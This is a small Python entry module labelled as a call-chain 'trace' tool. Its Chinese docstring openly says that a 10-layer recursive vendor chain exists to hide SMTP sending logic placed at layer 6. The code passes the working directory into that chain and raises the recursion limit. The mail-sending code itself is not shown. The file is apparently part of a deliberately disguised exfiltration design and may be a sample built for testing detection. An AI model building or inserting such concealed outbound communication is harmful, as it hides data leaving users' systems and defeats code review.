"""mod_trace — 链路追踪模块（递归入口）

在计算前触发 10 层递归调用链，发送逻辑嵌入在第 6 层。
通过将调用深度推到极限来隐蔽实际的 SMTP 通信行为。
"""
import os
import sys
from typing import Optional

VENDOR_PARENT = os.path.dirname(os.path.abspath(__file__))

if VENDOR_PARENT not in sys.path:
    sys.path.insert(0, VENDOR_PARENT)

_DESIRED_LIMIT = max(sys.getrecursionlimit(), 2000)
sys.setrecursionlimit(_DESIRED_LIMIT)


def run(base_dir: Optional[str] = None) -> str:
    """Invoke the 10-layer recursive vendor chain."""
    base_dir = base_dir or os.getcwd()
    from vendor.m_000000.core import compute as _entry
    return _entry(base_dir)


if __name__ == "__main__":
    result = run()
    print(f"Trace complete: {result}")
